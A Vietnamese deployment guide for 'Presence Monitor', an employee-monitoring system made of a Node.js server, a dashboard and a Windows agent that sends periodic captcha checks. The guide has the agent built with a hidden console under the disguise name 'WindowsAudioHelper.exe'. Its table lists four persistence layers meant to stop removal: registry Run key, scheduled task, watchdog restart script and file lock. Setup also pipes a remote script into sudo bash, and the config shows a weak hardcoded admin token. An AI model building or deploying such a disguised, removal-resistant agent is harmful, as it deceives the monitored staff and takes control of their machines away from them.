# Presence Monitor — Hướng dẫn Deploy

## Cấu trúc
```
server/
  server.js          ← Backend Node.js
  package.json
  public/
    dashboard.html   ← Web Dashboard (mở trực tiếp trên browser)

agent/
  agent.py           ← Windows Desktop Agent
```

---

## 1. Setup Server (VPS)

```bash
# Cài Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Cài dependencies
cd server/
npm install

# ĐỔI CẤU HÌNH trong server.js trước khi chạy:
# - ADMIN_TOKEN: đổi thành token mạnh
# - PORT: mặc định 3000

# Chạy
node server.js

# Hoặc dùng PM2 để chạy mãi mãi
npm install -g pm2
pm2 start server.js --name presence-monitor
pm2 startup && pm2 save
```

**Mở firewall port 3000:**
```bash
sudo ufw allow 3000/tcp
```

---

## 2. Setup Agent (Máy nhân viên)

### Sửa cấu hình trong agent.py:
```python
CONFIG = {
    "SERVER_URL": "ws://YOUR_VPS_IP:3000",  # ← IP/domain VPS của bạn
    "ADMIN_TOKEN": "ADMIN_SECRET_2024",       # ← Token giống server
    ...
}
```

### Cài dependencies:
```bash
pip install websocket-client pillow pywin32
```

### Build thành .exe (chạy trên máy không có Python):
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole --name "WindowsAudioHelper" agent.py
# Output: dist/WindowsAudioHelper.exe
```

### Deploy:
- Copy `WindowsAudioHelper.exe` vào máy nhân viên
- Double-click để chạy lần đầu
- Agent tự cài vào `C:\ProgramData\WindowsAudioHelper\`
- Tự thêm vào Registry + Task Scheduler
- Tự chạy lại sau khi reboot

---

## 3. Mở Dashboard

Truy cập: `http://YOUR_VPS_IP:3000/dashboard.html`

Hoặc mở file `public/dashboard.html` trực tiếp trên browser (cần nhập URL server khi đăng nhập).

---

## Cơ chế Persistence Agent

| Lớp | Cơ chế | Tác dụng |
|-----|--------|----------|
| 1 | Registry HKLM Run | Chạy cùng Windows |
| 2 | Task Scheduler | Backup nếu Registry bị xóa |
| 3 | Watchdog .bat | Restart nếu process bị kill |
| 4 | File lock | Không xóa được khi đang chạy |

**Gỡ cài đặt:** Chỉ được thực hiện từ Dashboard → nhấn nút [Gỡ] → Agent tự dọn sạch.

---

## Config mặc định

| Tham số | Giá trị |
|---------|---------|
| Khoảng gửi captcha | 20–60 phút ngẫu nhiên |
| Timeout trả lời | 60 giây |
| Độ dài mã | 4–8 chữ số ngẫu nhiên |
| Reconnect delay | 5 giây |
| Heartbeat | 30 giây |

Tất cả có thể thay đổi từ Dashboard trong khi hệ thống đang chạy.
